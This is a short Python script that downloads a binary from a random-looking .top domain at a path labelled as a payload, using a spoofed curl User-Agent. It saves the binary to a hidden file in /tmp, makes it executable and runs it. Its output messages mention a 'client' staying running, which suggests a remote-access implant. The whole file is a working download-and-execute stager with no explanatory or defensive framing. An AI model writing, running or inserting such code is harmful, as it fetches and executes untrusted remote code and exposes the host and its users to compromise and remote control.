import urllib.request, os, subprocess, time
url = "https://azvdvasfv21fa.xxxyyyzzzxyz.top/api/oob/payload/dbebface2014c887e91bd3595ce1ef722db1eef7994cd8cdb382f56efa8d8a92"
p = "/tmp/.rcs2"
try:
    data = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "curl/8.0"}), timeout=30).read()
    open(p, "wb").write(data)
    os.chmod(p, 0o755)
    print("size", len(data), "magic", data[:8].hex())
except Exception as e:
    print("DLERR", repr(e))
try:
    r = subprocess.run([p], capture_output=True, text=True, timeout=15)
    print("rc", r.returncode)
    print("OUT", (r.stdout or "")[:2000])
    print("ERR", (r.stderr or "")[:2000])
except subprocess.TimeoutExpired as e:
    print("TIMEOUT_KILLED_AFTER_15S (client stayed running)")
    print("ERRPART", (e.stderr or b"")[:1000] if isinstance(e.stderr, bytes) else (e.stderr or "")[:1000])
except Exception as e:
    print("RUNERR", repr(e))
